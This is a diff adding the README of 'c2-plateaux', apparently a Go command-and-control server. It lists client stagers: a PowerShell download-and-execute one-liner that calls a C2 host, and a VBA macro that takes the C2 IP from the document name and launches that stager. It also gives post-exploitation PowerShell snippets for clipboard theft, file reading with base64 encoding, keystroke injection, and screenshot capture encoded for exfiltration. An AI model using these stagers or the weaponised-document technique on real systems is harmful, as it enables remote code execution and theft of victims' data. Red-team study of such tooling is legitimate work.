@@ -1,0 +1,69 @@
+    c2-plateaux - C2-Plateaux
+
+USAGE
+
+    go build main.go
+    ./c2-plateaux -h
+
+CLIENT EXAMPLES
+
+  - Powershell
+
+    powershell -Command "iex(iwr('http://192.168.122.1:8080/psh'))"
+    powershell -Enc Lala=
+
+  - VBA - Powershell (read IP from document name)
+
+    ip = Left(ActiveDocument.Name, Len(ActiveDocument.Name) - 4)
+    Shell "powershell -command ""iex(iwr('http://" & ip & "/psh'))"""
+
+POWERSHELL EXAMPLES
+
+  - Sound
+
+    [System.Console]::Beep(6000,500)
+
+    [System.Media.SystemSounds]::Asterisk.Play()
+    [System.Media.SystemSounds]::Beep.Play()
+    [System.Media.SystemSounds]::Exclamation.Play()
+    [System.Media.SystemSounds]::Hand.Play()
+    [System.Media.SystemSounds]::Question.Play()
+
+  - Clipboard
+
+    Get-Clipboard
+
+  - Process
+
+    Stop-Process -Name Calculator
+
+  - File input
+
+    Get-Content -Path C:\Windows\win.ini
+
+  - Base64
+
+    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Windows\win.ini"))
+
+  - Send keys
+
+    $wshShell = New-Object -ComObject Wscript.Shell
+
+    $wshShell.SendKeys("% x")
+    $wshShell.SendKeys("Barfoota")
+
+  - Screenshot
+
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $screenshotImage = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphicObject = [System.Drawing.Graphics]::FromImage($screenshotImage)
+    $graphicObject.CopyFromScreen($Left, $Top, 0, 0, $screenshotImage.Size)
+    $screenshotImage.Save("$env:TEMP\screenshot.png")
+
+    [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\screenshot.png"))
